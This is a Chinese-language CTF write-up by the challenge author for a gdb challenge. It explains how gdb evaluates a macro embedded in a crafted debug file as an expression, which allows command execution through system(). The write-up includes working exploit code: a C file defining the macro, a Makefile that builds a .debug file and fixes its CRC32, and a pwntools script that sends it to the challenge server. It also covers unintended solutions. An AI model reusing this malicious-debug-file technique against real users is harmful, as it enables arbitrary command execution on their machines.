# Writeups by Anciety

## gdb

### 题目介绍

本题目的来源是在今年参加 DEFCON 的时候碰到的题目，exploit-for-dummies，当时的题目情况和这题目类似，我们在做的过程中发现了 gdb 的一些奇怪的行为，最后决定把他作为一道题目。

这道题目其实在今年 XCTF 决赛的线下赛中已经使用过了，但是并没有预期答案，当时出现了一些小问题，非预期（很遗憾的是，这次还是出现了……忘记修了），后来修复之后就没有预期解了。

题目的逻辑很简单，远程的 gdb 会 debug 一个程序，程序中并不执行什么功能，但是会在断在 main 函数之后试图打印 a 变量，之后就退出了。

整体的思路来说，我们要在打印 a 变量的时候，试图 trick gdb ，让他打印出 flag。

### 预期思路

这是一个我们在 DEFCON 参赛时发现的问题， gdb 在处理宏的时候，**并不是将宏作为"变量"进行处理的**，而是直接认为是一个表达式。

这样，当宏的实际定义是一个合法的 gdb 表达式时，就会直接**运行这个表达式**，通过这样的方式，在打印 a 变量时，如果 a 变量是一个宏，其实是可以直接运行一小段 gdb 表达式的，这样其实就可以干很多事情了，甚至直接进入系统。

所以题目的解法并不难：

1. `#define a system("/bin/sh")` ，然后编译这个程序，注意需要用 `-g3` 编译，否则宏信息不会在最终输出的文件中。
2. 大小可能会超标，所以编译时可能需要带一些参数，比如 `gcc -o hello hello.c -g3 -nostartfiles -nostdlib -nodefaultlibs -undef`
3. 由于我们所编译的文件和实际 gdb debug 的文件不一样，所以需要 CRC32 值能够成功匹配，gdb 才能够自动加载我们的debug文件，所以需要过一下 CRC32 的 check 。（需要了解一下 DWARF 对 CRC32 机制的验证）

其中其实，除了CRC32部分，甚至都可以不需要了解 DWARF （debug文件信息）的格式。

### 非预期问题

#### 愚蠢的 bug

这个 bug 就是在 XCTF 中已经出现的愚蠢 bug …… 在脚本中，最后忘记添加 `-ex q` ，导致在执行完命令之后，用户依然还在 gdb 的 CLI 里，可以直接执行命令。。。当然，这个 bug 太严重，所以最后修复了。

#### 其他非预期

没想到的是，居然还看到了一种新的非预期解题方式，思路也比较巧妙，主要是利用了 gdb 会自动打印当前行源码的特点，然后将 debug 文件中，源码路径的部分直接修改为 `/flag` ，从而在打印文件时，直接可以打印源码。

事实上这种方式也是利用了 gdb 的特点，虽然是非预期，但是我认为还是基本符合 “探索 gdb 的奇怪行为” 的主题的，所以也没有针对性进行修复，十分有意思的想法。

如果需要进行针对性的修复的话，可以将 `/flag` 的读取变为运行一个文件才能读到 flag ，这样就必须获取到 shell 了。

### 答案

hello.c

```c
/* This file should deal with the debug section generation */

#define a system("cat /flag")

int main() {
    return 0;
}
```

解决 crc32 问题：[fixcrc.py](sol/gdb/fixcrc.py) 和 [forcecrc32.py](sol/gdb/forcecrc32.py) 。


生成 .debug 文件（Makefile）：

```makefile
all:
	gcc -o hello hello.c -g3 -nostartfiles -nostdlib -nodefaultlibs -undef
	objcopy --only-keep-debug hello hello.debug
	python3 fixcrc.py
	rm hello

clean:
	rm hello.debug
```

交互脚本：

```python
from pwn import *

p = remote("prob14.geekgame.pku.edu.cn", 10014)
p.sendlineafter("token:", token)

p.recvuntil('> \n')

with open('./hello.debug', 'rb') as f:
    content = f.read()

print(len(content))

p.send(content)
p.shutdown('write')
p.interactive()
```

PS：可以发送满 0x1024 字节。或者用 pwntools 的 [shutdown](https://docs.pwntools.com/en/stable/tubes.html#pwnlib.tubes.tube.tube.shutdown) 函数结束输出。